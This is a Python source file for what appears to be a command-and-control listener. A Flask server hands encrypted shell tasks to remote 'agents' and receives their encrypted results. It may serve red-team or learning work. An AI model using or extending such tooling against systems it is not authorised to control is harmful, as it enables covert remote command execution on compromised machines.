import os
from encryption import *
from task import TaskShell
from flask import Flask, request, jsonify
import random

class Listener:
    def __init__(self, name, port, ipaddress):
        self.name = name
        self.port = port
        self.ipaddress = ipaddress

        # Define the directory paths for listener data
        self.Path = "data/listeners/{}/".format(self.name)
        self.keyPath = "{}key".format(self.Path)
        self.filePath = "{}files/".format(self.Path)
        self.agentsPath = "{}agents/".format(self.Path)

        # Create directories if they don't exist
        if not os.path.exists(self.Path):
            os.makedirs(self.Path)
        if not os.path.exists(self.agentsPath):
            os.makedirs(self.agentsPath)
        if not os.path.exists(self.filePath):
            os.makedirs(self.filePath)

        if not os.path.exists(self.keyPath):
            key = generateKey()
            self.key = key
            with open(self.keyPath, "wt") as f:
                f.write(key)
        else:
            with open(self.keyPath, "rt") as f:
                self.key = f.read()

    def start(self):
        print("Listener '{}' started on {}:{}".format(self.name, self.ipaddress, self.port))
        app = Flask(__name__)

        @app.route('/ping', methods=['GET'])
        def ping():
            return jsonify({'message': 'pong', 'random_number': random.randint(1, 100)})

        @app.route('/getTask', methods=['GET'])
        def get_task():
            task_path = "task.txt"
            task_obj = TaskShell(task_path, command="ls") 
            with open(task_obj.taskPath, "r") as f:
                task_plain = f.read()
            encrypted_task = ENCRYPT(task_plain, self.key)
            return jsonify({"task": encrypted_task})

        @app.route('/postResult', methods=['POST'])
        def post_result():
            data = request.get_json()
            encrypted_result = data.get("result")
            result = DECRYPT(encrypted_result, self.key)
            print("Received result from agent:", result)
            return jsonify({"status": "received"})
        
        app.run(host=self.ipaddress, port=self.port)

if __name__ == "__main__":
    listener = Listener("example_listener", 51002, "127.0.0.1")
    listener.start()
